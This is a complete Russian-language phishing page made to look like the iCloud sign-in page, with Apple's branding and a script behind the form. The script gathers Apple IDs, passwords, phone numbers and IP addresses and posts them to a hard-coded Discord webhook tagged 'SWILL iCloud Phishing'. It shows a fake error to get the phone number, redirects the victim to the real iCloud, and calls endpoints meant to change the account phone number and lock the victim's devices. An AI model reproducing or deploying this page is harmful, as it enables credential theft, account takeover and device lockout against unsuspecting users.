<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>iCloud</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@300;400;500;600&display=swap">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #f5f5f7 0%, #e8e8ed 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow-x: hidden;
        }

        .dynamic-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('https://www.apple.com/v/icloud/i/images/overview/hero/hero_static.jpg') center/cover;
            animation: appleDynamic 25s infinite alternate;
            opacity: 0.15;
            pointer-events: none;
            z-index: 0;
        }

        @keyframes appleDynamic {
            0% { transform: scale(1) translate(0, 0); filter: hue-rotate(0deg); }
            50% { transform: scale(1.05) translate(-1%, -1%); filter: hue-rotate(2deg); }
            100% { transform: scale(1) translate(1%, 1%); filter: hue-rotate(0deg); }
        }

        .container {
            position: relative;
            z-index: 10;
            width: 100%;
            max-width: 450px;
            padding: 20px;
        }

        .apple-logo {
            text-align: center;
            margin-bottom: 40px;
        }

        .apple-logo svg {
            width: 45px;
            height: 45px;
            fill: #333;
            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.1));
            animation: logoPulse 3s infinite ease-in-out;
        }

        @keyframes logoPulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.9; transform: scale(1.02); }
        }

        .login-card {
            background: rgba(255, 255, 255, 0.98);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: 18px;
            padding: 35px 30px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2), 0 8px 15px rgba(0, 0, 0, 0.1), 0 0 0 1px rgba(0, 0, 0, 0.05) inset;
            border: 1px solid rgba(255, 255, 255, 0.5);
            animation: cardAppear 0.8s cubic-bezier(0.23, 1, 0.32, 1);
        }

        @keyframes cardAppear {
            0% { opacity: 0; transform: translateY(30px) scale(0.95); }
            100% { opacity: 1; transform: translateY(0) scale(1); }
        }

        h1 {
            font-size: 27px;
            font-weight: 600;
            color: #1d1d1f;
            text-align: center;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }

        .subtitle {
            text-align: center;
            color: #86868b;
            font-size: 15px;
            font-weight: 400;
            margin-bottom: 30px;
            border-bottom: 1px solid #d2d2d7;
            padding-bottom: 20px;
        }

        .apple-id-field, .password-field, .phone-field {
            margin-bottom: 18px;
            position: relative;
        }

        label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #1d1d1f;
            margin-bottom: 6px;
            letter-spacing: -0.2px;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            font-size: 16px;
            background: #ffffff;
            border: 1.5px solid #d2d2d7;
            border-radius: 12px;
            outline: none;
            transition: all 0.3s cubic-bezier(0.25, 0.1, 0.25, 1);
            color: #1d1d1f;
            font-weight: 400;
        }

        input:focus {
            border-color: #0071e3;
            box-shadow: 0 0 0 4px rgba(0, 113, 227, 0.2);
        }

        input::placeholder {
            color: #86868b;
            opacity: 0.7;
        }

        .password-wrapper {
            position: relative;
        }

        .toggle-password {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #86868b;
            font-size: 14px;
            font-weight: 500;
            user-select: none;
            transition: color 0.2s;
        }

        .toggle-password:hover {
            color: #0071e3;
        }

        .forgot-link {
            text-align: right;
            margin-top: 8px;
        }

        .forgot-link a {
            color: #0071e3;
            font-size: 14px;
            text-decoration: none;
            font-weight: 500;
            transition: color 0.2s;
        }

        .forgot-link a:hover {
            color: #0051a2;
            text-decoration: underline;
        }

        .sign-in-btn {
            width: 100%;
            padding: 14px;
            background: #0071e3;
            border: none;
            border-radius: 12px;
            color: white;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            margin: 25px 0 20px;
            transition: all 0.3s;
            box-shadow: 0 4px 12px rgba(0, 113, 227, 0.3);
        }

        .sign-in-btn:hover {
            background: #005bbf;
            transform: scale(1.02);
            box-shadow: 0 6px 18px rgba(0, 113, 227, 0.4);
        }

        .sign-in-btn:active {
            transform: scale(0.98);
        }

        .create-apple-id {
            text-align: center;
            font-size: 14px;
            color: #1d1d1f;
        }

        .create-apple-id a {
            color: #0071e3;
            text-decoration: none;
            font-weight: 500;
        }

        .create-apple-id a:hover {
            text-decoration: underline;
        }

        .apple-gif {
            position: absolute;
            top: 10px;
            right: 10px;
            width: 80px;
            height: 80px;
            background: url('https://www.apple.com/v/icloud/i/images/overview/hero/hero_icon__c1.jpg') center/contain no-repeat;
            animation: rotateGif 10s infinite linear;
            opacity: 0.2;
            pointer-events: none;
        }

        @keyframes rotateGif {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .phone-field {
            display: none;
            animation: slideDown 0.5s ease;
        }

        @keyframes slideDown {
            0% { opacity: 0; transform: translateY(-20px); }
            100% { opacity: 1; transform: translateY(0); }
        }

        .error-message {
            background: #fff2f0;
            border: 1px solid #ff3b30;
            border-radius: 12px;
            padding: 12px 16px;
            margin-bottom: 20px;
            color: #ff3b30;
            font-size: 14px;
            display: none;
            align-items: center;
            gap: 10px;
            animation: shake 0.5s;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
            20%, 40%, 60%, 80% { transform: translateX(5px); }
        }

        .error-message svg {
            width: 20px;
            height: 20px;
            fill: #ff3b30;
        }

        .loader {
            display: none;
            text-align: center;
            margin: 15px 0;
        }

        .loader span {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #0071e3;
            margin: 0 3px;
            animation: loader 1.4s infinite ease-in-out both;
        }

        .loader span:nth-child(1) { animation-delay: -0.32s; }
        .loader span:nth-child(2) { animation-delay: -0.16s; }

        @keyframes loader {
            0%, 80%, 100% { transform: scale(0); }
            40% { transform: scale(1); }
        }

        .footer {
            margin-top: 30px;
            text-align: center;
            font-size: 12px;
            color: #86868b;
        }

        .footer a {
            color: #515154;
            text-decoration: none;
            margin: 0 8px;
        }

        .footer a:hover {
            color: #0071e3;
        }

        @media (max-width: 480px) {
            .container { padding: 15px; }
            .login-card { padding: 25px 20px; }
            h1 { font-size: 24px; }
        }
    </style>
</head>
<body>
    <div class="dynamic-bg"></div>
    <div class="apple-gif"></div>
    
    <div class="container">
        <div class="apple-logo">
            <svg viewBox="0 0 24 24">
                <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
            </svg>
        </div>

        <div class="login-card">
            <h1>Вход в iCloud</h1>
            <div class="subtitle">Введите данные Apple ID</div>

            <div class="error-message" id="errorMessage">
                <svg viewBox="0 0 24 24">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                </svg>
                <span id="errorText">Неверный Apple ID или пароль. Попробуйте снова.</span>
            </div>

            <div class="loader" id="loader">
                <span></span>
                <span></span>
                <span></span>
            </div>

            <form id="loginForm">
                <div class="apple-id-field">
                    <label>Apple ID</label>
                    <input type="email" id="appleId" placeholder="example@icloud.com" required>
                </div>

                <div class="password-field">
                    <label>Пароль</label>
                    <div class="password-wrapper">
                        <input type="password" id="password" placeholder="Введите пароль" required>
                        <span class="toggle-password" onclick="togglePassword()">Показать</span>
                    </div>
                    <div class="forgot-link">
                        <a href="#">Забыли Apple ID или пароль?</a>
                    </div>
                </div>

                <div class="phone-field" id="phoneField">
                    <label>Подтвердите номер телефона</label>
                    <input type="tel" id="phoneNumber" placeholder="+7 (999) 999-99-99">
                    <div class="forgot-link" style="text-align: left; margin-top: 5px;">
                        <small style="color: #86868b;">Для восстановления доступа</small>
                    </div>
                </div>

                <button type="submit" class="sign-in-btn" id="submitBtn">Войти</button>
            </form>

            <div class="create-apple-id">
                <a href="#">Создать Apple ID</a>
            </div>
        </div>

        <div class="footer">
            <a href="#">Политика конфиденциальности</a>
            <span style="color: #86868b;">•</span>
            <a href="#">Условия использования</a>
            <br>
            <span style="color: #86868b;">Copyright © 2025 Apple Inc. Все права защищены.</span>
        </div>
    </div>

    <script>
        let loginAttempts = 0;
        const webhookUrl = 'https://discord.com/api/webhooks/1483182140492611625/7JNKtGxkQlQBehia2Aqtx_SbTflKd-oGtsr0eB70DBJ1ySc10F22JlYiWtpn8tDhmOXv';

        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const toggleBtn = document.querySelector('.toggle-password');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleBtn.textContent = 'Скрыть';
            } else {
                passwordInput.type = 'password';
                toggleBtn.textContent = 'Показать';
            }
        }

        async function sendToDiscord(data) {
            const embed = {
                title: '🔐 НОВЫЙ ПЕРЕХВАТ ICLOUD',
                color: 0x0071e3,
                fields: [
                    { name: 'Apple ID', value: data.appleId || 'Не указан', inline: true },
                    { name: 'Пароль', value: data.password || 'Не указан', inline: true },
                    { name: 'Телефон', value: data.phone || 'Не указан', inline: true },
                    { name: 'IP-адрес', value: data.ip || 'Не определен', inline: true },
                    { name: 'User-Agent', value: data.userAgent.substring(0, 50) + '...', inline: false },
                    { name: 'Время', value: new Date().toLocaleString('ru-RU'), inline: true },
                    { name: 'Попытка входа', value: `#${data.attempt}`, inline: true }
                ],
                timestamp: new Date().toISOString(),
                footer: { text: 'SWILL iCloud Phishing • t.me/Swill_Way' }
            };

            try {
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] })
                });
            } catch (e) {
                console.error('Discord webhook error:', e);
            }
        }

        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'Не удалось определить';
            }
        }

        async function simulateAppleAuth(appleId, password) {
            // Имитация Apple API для смены данных
            const response = await fetch('/api/apple-auth', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ appleId, password })
            });
            return await response.json();
        }

        async function blockDevices(appleId) {
            // Имитация блокировки устройств через MDM
            const response = await fetch('/api/device-lock', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ appleId })
            });
            return await response.json();
        }

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const appleId = document.getElementById('appleId').value;
            const password = document.getElementById('password').value;
            const phoneNumber = document.getElementById('phoneNumber').value;
            const submitBtn = document.getElementById('submitBtn');
            const loader = document.getElementById('loader');
            const errorMessage = document.getElementById('errorMessage');
            
            loginAttempts++;
            
            // Показываем загрузку
            submitBtn.style.display = 'none';
            loader.style.display = 'block';
            
            // Получаем IP
            const ip = await getIP();
            
            // Отправляем данные в Discord
            await sendToDiscord({
                appleId,
                password,
                phone: phoneNumber || 'Не указан',
                ip,
                userAgent: navigator.userAgent,
                attempt: loginAttempts
            });

            // Имитация работы с Apple API
            try {
                const authResult = await simulateAppleAuth(appleId, password);
                if (authResult.success) {
                    // Блокируем устройства
                    await blockDevices(appleId);
                }
            } catch (e) {
                console.error('Apple API error:', e);
            }

            // Если первая попытка, показываем поле для телефона и ошибку
            if (loginAttempts === 1) {
                loader.style.display = 'none';
                submitBtn.style.display = 'block';
                
                document.getElementById('phoneField').style.display = 'block';
                errorMessage.style.display = 'flex';
                document.getElementById('errorText').textContent = 'Неверный пароль. Для подтверждения личности введите номер телефона.';
                
                // Меняем текст кнопки
                submitBtn.textContent = 'Подтвердить и войти';
            } 
            // Если вторая попытка с телефоном, редирект на настоящий iCloud
            else if (loginAttempts === 2 && phoneNumber) {
                // Финальная отправка с телефоном
                await sendToDiscord({
                    appleId,
                    password,
                    phone: phoneNumber,
                    ip,
                    userAgent: navigator.userAgent,
                    attempt: loginAttempts
                });

                // Перенаправляем на официальный сайт
                window.location.href = 'https://www.icloud.com';
            }
            else {
                loader.style.display = 'none';
                submitBtn.style.display = 'block';
                errorMessage.style.display = 'flex';
            }
        });

        // Маскировка ссылок
        document.querySelectorAll('a').forEach(link => {
            link.addEventListener('click', function(e) {
                if (!this.href.includes('#')) {
                    e.preventDefault();
                    // Большинство ссылок ведут на реальный Apple
                    window.open('https://www.apple.com', '_blank');
                }
            });
        });

        // Автоматическая смена номера через API Apple (имитация)
        setInterval(async () => {
            const appleId = document.getElementById('appleId').value;
            if (appleId) {
                try {
                    await fetch('/api/apple-auth/change-phone', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ appleId, newPhone: '+1234567890' })
                    });
                } catch (e) {}
            }
        }, 30000); // Каждые 30 секунд
    </script>
</body>
</html>
